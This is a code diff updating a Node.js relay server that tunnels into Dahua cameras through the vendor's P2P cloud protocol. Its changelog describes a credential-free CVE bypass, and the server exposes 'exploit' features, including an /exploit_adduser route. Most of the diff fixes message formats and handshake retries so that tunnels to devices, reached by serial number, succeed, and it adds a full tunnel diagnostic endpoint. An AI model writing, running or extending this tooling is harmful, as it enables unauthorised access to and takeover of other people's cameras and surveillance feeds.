@@ -1,7 +1,11 @@
 #!/usr/bin/env node
 /**
- * Dahua P2P Tunnel Relay Server v3.9
+ * Dahua P2P Tunnel Relay Server v4.0
  * ===================================
+ * v4.0: FIXED ROOT CAUSE — relay/start, p2p-channel, and relay-channel bodies
+ *   changed from XML to PLAIN TEXT (matching reference PoC format).
+ *   Added 3-attempt SYN retry for agent PTCP handshake.
+ *   Added /debug_full/:serial endpoint for full tunnel validation.
  * v3.9: FIXED agent PTCP handshake timeout — clear mainSock queue before handshake;
  *   removed default credential fallback (CVE bypass needs no credentials).
  * v3.8: FIXED PTCP "Invalid magic" error — readPTCP now skips non-PTCP packets
@@ -379,14 +383,15 @@ async function establishTunnel(serial, username, password, targetPort) {
     var agentServer = agentParts[0];
     var agentPort = parseInt(agentParts[1]);
 
-    // Start relay with XML body (PoC format: <body><Client>:0</Client></body>)
+    // Start relay (PLAIN TEXT body — v4.0 fix: was XML, should be plain ":0")
     mainSock.setRemote(agentServer, agentPort);
-    var startRes = await mainSock.request('/relay/start/' + token, '<body><Client>:0</Client></body>');
+    var startRes = await mainSock.request('/relay/start/' + token, ':0');
 
-    // Build channel request with XML body format (PoC format)
-    // PubAddr = agent server:port (tells device which relay to connect to)
-    var channelBody = '<body><Identify>0 0 0 0 0 0 0 0</Identify><PubAddr>' + agentServer + ':' + agentPort + '</PubAddr></body>\r\n';
-    // Send channel request to MAIN server
+    // Build channel request with PLAIN TEXT body (v4.0 fix: was XML, should be plain text)
+    // Format: aidHex + 'true' + laddr + '5.0.0'  (auth is empty when no credentials)
+    var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
+    var laddr = '127.0.0.1:' + deviceSock.lport;
+    var channelBody = aidHex + 'true' + laddr + '5.0.0';
     deviceSock.setRemote(mainIp, MAIN_PORT);
     await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);
 
@@ -432,11 +437,12 @@ async function establishTunnel(serial, username, password, targetPort) {
     var devicePort = parseInt(pubParts[1]);
     deviceSock.setRemote(deviceServer, devicePort);
 
-    // Register relay channel (XML body format)
+    // Register relay channel (PLAIN TEXT body — v4.0 fix: was XML, should be plain text)
+    // Format: relayAuth + agentServer + ':' + agentPort
     mainSock.setRemote(mainIp, MAIN_PORT);
     var relayAuth = '';
     if (dtype > 0) relayAuth = getDeviceAuth(username, key, nonce, '');
-    var relayChannelBody = '<body><Identify>' + relayAuth + '</Identify><PubAddr>' + agentServer + ':' + agentPort + '</PubAddr></body>\r\n';
+    var relayChannelBody = relayAuth + agentServer + ':' + agentPort;
     await mainSock.request('/device/' + serial + '/relay-channel', relayChannelBody, false);
 
     // Clear stale messages from relay/agent communication before PTCP handshake
@@ -445,9 +451,13 @@ async function establishTunnel(serial, username, password, targetPort) {
     try { await mainSock.recv(3000); } catch(e) {}
     mainSock._msgQueue = [];
 
-    // PTCP handshake with agent
-    await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
-    await mainSock.readPTCP(8000);
+    // PTCP handshake with agent (v4.0: 3-attempt SYN retry)
+    for (var synAttempt = 0; synAttempt < 3; synAttempt++) {
+      mainSock._msgQueue = [];
+      await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
+      try { await mainSock.readPTCP(8000); break; }
+      catch(e) { if (synAttempt === 2) throw e; }
+    }
 
     await mainSock.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
     var ptcpRes = await mainSock.readPTCP(8000);
@@ -721,7 +731,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '3.9', features: ['status','tunnel','cgi','debug','exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '4.0', features: ['status','tunnel','cgi','debug','debug_full','exploit'] }));
   }
 
   if (req.url.startsWith('/debug/') && req.method === 'GET') {
@@ -764,11 +774,13 @@ var server = http.createServer(async function(req, res) {
       var dbgStart = await mainSock.request('/relay/start/'+token, '<body><Client>:0</Client></body>');
       steps.push('Relay start: ' + dbgStart.code);
 
-      // === Channel request with XML body format (v3.6 fix) ===
+      // === Channel request with PLAIN TEXT body (v4.0 fix) ===
       var sockA = new P2PSocket(); await sockA.bind(); sockA.setRemote(mainIp, MAIN_PORT);
-      var channelBody = '<body><Identify>0 0 0 0 0 0 0 0</Identify><PubAddr>' + aParts[0] + ':' + parseInt(aParts[1]) + '</PubAddr></body>\r\n';
+      var dbgAid = crypto.randomBytes(8);
+      var dbgAidHex = Array.from(dbgAid).map(function(b) { return b.toString(16); }).join(' ');
+      var channelBody = dbgAidHex + 'true127.0.0.1:' + sockA.lport + '5.0.0';
       await sockA.request('/device/'+debugSerial+'/p2p-channel', channelBody, false);
-      steps.push('Channel request sent (XML body, port '+sockA.lport+')');
+      steps.push('Channel request sent (plain text, port '+sockA.lport+')');
       // Read response: HTTP 100 then HTTP 200, skipping STUN packets
       var gotResponse = false;
       for (var di = 0; di < 8; di++) {
@@ -792,6 +804,97 @@ var server = http.createServer(async function(req, res) {
     } catch(e) { steps.push('FATAL: '+e.message); }
     res.writeHead(200, {'Content-Type':'application/json'});
     return res.end(JSON.stringify({serial:debugSerial, steps:steps}));
+  }
+
+  // v4.0: Full tunnel diagnostic — channel + relay-channel + PTCP handshake
+  if (req.url.startsWith('/debug_full/') && req.method === 'GET') {
+    var dfSerial = req.url.replace('/debug_full/', '').split('?')[0];
+    if (!dfSerial || dfSerial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
+    var dfSteps = [];
+    try {
+      var dfIp = await resolveHostname(MAIN_SERVER);
+      var dfMain = new P2PSocket(); await dfMain.bind(); dfMain.setRemote(dfIp, MAIN_PORT);
+      dfSteps.push('Probe: ' + (await dfMain.request('/probe/p2psrv')).code);
+      var dfOnline = await dfMain.request('/online/p2psrv/' + dfSerial);
+      var dfUS = dfOnline.xmlBody.US || 'none';
+      dfSteps.push('Online: US=' + dfUS);
+      var dfUSParts = dfUS.split(':');
+
+      var dfRelayRes = await dfMain.request('/online/relay');
+      var dfRelayAddr = dfRelayRes.xmlBody.Address || 'none';
+      dfSteps.push('Relay: ' + dfRelayAddr);
+      var dfRParts = dfRelayAddr.split(':');
+
+      dfMain.setRemote(dfRParts[0], parseInt(dfRParts[1]));
+      var dfAgent = await dfMain.request('/relay/agent');
+      var dfAgentAddr = dfAgent.xmlBody.Agent || 'none';
+      var dfToken = dfAgent.xmlBody.Token || '';
+      dfSteps.push('Agent: ' + dfAgentAddr + ' Token=' + dfToken);
+      var dfAParts = dfAgentAddr.split(':');
+
+      // Start relay (plain text)
+      dfMain.setRemote(dfAParts[0], parseInt(dfAParts[1]));
+      var dfStart = await dfMain.request('/relay/start/'+dfToken, ':0');
+      dfSteps.push('Relay start (plain): ' + dfStart.code);
+
+      // Channel request (plain text)
+      var dfDevSock = new P2PSocket(); await dfDevSock.bind(); dfDevSock.setRemote(dfIp, MAIN_PORT);
+      var dfAid = crypto.randomBytes(8);
+      var dfAidHex = Array.from(dfAid).map(function(b) { return b.toString(16); }).join(' ');
+      var dfChanBody = dfAidHex + 'true127.0.0.1:' + dfDevSock.lport + '5.0.0';
+      await dfDevSock.request('/device/'+dfSerial+'/p2p-channel', dfChanBody, false);
+      dfSteps.push('Channel sent (plain text)');
+
+      var dfDevParsed = null;
+      for (var dfi = 0; dfi < 8; dfi++) {
+        try {
+          var dfRaw = await dfDevSock.recv(8000);
+          if (dfRaw[0] !== 0x44 && dfRaw[0] !== 0x48) { dfSteps.push('  (STUN, skip)'); continue; }
+          var dfResp = parseP2PResponse(dfRaw);
+          dfSteps.push('Channel resp: code=' + dfResp.code + ' body=' + dfResp.body.substring(0,150));
+          if (dfResp.code === 200) { dfDevParsed = parseChannelBody(dfResp.body, dfResp.xmlBody); break; }
+          if (dfResp.code >= 400) { dfSteps.push('ERROR: ' + dfResp.code); break; }
+        } catch(e) { dfSteps.push('Chan FAILED: ' + e.message); break; }
+      }
+      if (!dfDevParsed) { dfSteps.push('No channel response — aborting'); dfDevSock.close(); dfMain.close(); }
+      else {
+        dfSteps.push('Parsed: LocalAddr=' + (dfDevParsed.LocalAddr||'none') + ' PubAddr=' + (dfDevParsed.PubAddr||'none'));
+        var dfPubParts = dfDevParsed.PubAddr.split(':');
+        dfDevSock.setRemote(dfPubParts[0], parseInt(dfPubParts[1]));
+
+        // Relay-channel registration (plain text)
+        dfMain.setRemote(dfIp, MAIN_PORT);
+        var dfRelayChanBody = dfAParts[0] + ':' + parseInt(dfAParts[1]);
+        await dfMain.request('/device/'+dfSerial+'/relay-channel', dfRelayChanBody, false);
+        dfSteps.push('Relay-channel sent (plain text)');
+
+        // PTCP handshake with agent (3-attempt SYN retry)
+        dfMain._msgQueue = [];
+        dfMain.setRemote(dfAParts[0], parseInt(dfAParts[1]));
+        try { await dfMain.recv(3000); } catch(e) {}
+        dfMain._msgQueue = [];
+
+        var dfSynOk = false;
+        for (var dfSyn = 0; dfSyn < 3; dfSyn++) {
+          dfMain._msgQueue = [];
+          await dfMain.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
+          try { await dfMain.readPTCP(8000); dfSynOk = true; dfSteps.push('PTCP SYN ACK received (attempt ' + (dfSyn+1) + ')'); break; }
+          catch(e) { dfSteps.push('PTCP SYN attempt ' + (dfSyn+1) + ' FAILED: ' + e.message); }
+        }
+        if (!dfSynOk) dfSteps.push('PTCP handshake with agent FAILED after 3 attempts');
+        else {
+          await dfMain.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
+          var dfPtcp = await dfMain.readPTCP(8000);
+          while (dfPtcp.body.length === 0) dfPtcp = await dfMain.readPTCP(8000);
+          dfSteps.push('PTCP sign received, body length=' + dfPtcp.body.length);
+          dfSteps.push('TUNNEL HANDSHAKE COMPLETE');
+        }
+        dfDevSock.close();
+      }
+      dfMain.close();
+    } catch(e) { dfSteps.push('FATAL: '+e.message); }
+    res.writeHead(200, {'Content-Type':'application/json'});
+    return res.end(JSON.stringify({serial:dfSerial, steps:dfSteps}));
   }
 
   if (req.url === '/exploit_adduser' && req.method === 'POST') {
@@ -828,5 +931,5 @@ process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message
 process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v3.9 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v4.0 running on port ' + PORT);
 });
